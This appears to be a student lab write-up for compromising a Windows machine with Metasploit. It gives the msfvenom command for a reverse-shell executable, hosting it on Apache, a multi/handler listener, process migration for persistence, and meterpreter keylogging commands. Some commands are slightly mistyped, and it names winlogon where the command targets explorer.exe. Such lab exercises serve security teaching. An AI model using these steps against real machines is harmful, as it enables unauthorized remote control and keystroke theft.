# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
![image](https://github.com/user-attachments/assets/5df1f413-b774-4d9a-ae25-3caf62035504)

Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
![image](https://github.com/user-attachments/assets/44c48e38-d312-4774-8322-a0664b016b1b)

copy the fun.exe into the apache ``/var/www/html``` folder
![image](https://github.com/user-attachments/assets/e3e1bd9d-4598-4443-ae5f-0ca410e7e883)

Start apache server ```sudo systemctl apache2 start```
![image](https://github.com/user-attachments/assets/f30797d9-2b9a-47c9-8b3f-0fb983579dd8)

Check the status of apache2 ```sudo apache2 status```
![image](https://github.com/user-attachments/assets/a9931212-23e0-4901-8e09-e6172ebfc5ce)

#### Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set ```PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit```
![image](https://github.com/user-attachments/assets/daf2ff9e-3bf6-42d1-a516-7fd2d732a405)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/user-attachments/assets/7526775d-16cf-485e-8450-475bbf5f2624)


Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit
![image](https://github.com/user-attachments/assets/72713ea2-718b-4d6a-b760-4c9a50dbb885)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name
![image](https://github.com/user-attachments/assets/cb7fa5e9-55b7-4f34-ab2a-d4d4648cba6b)

```keyscan_dump``` Shows the keystrokes captured so far
![image](https://github.com/user-attachments/assets/63561e30-218e-4506-8a9e-8febfda8a03d)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
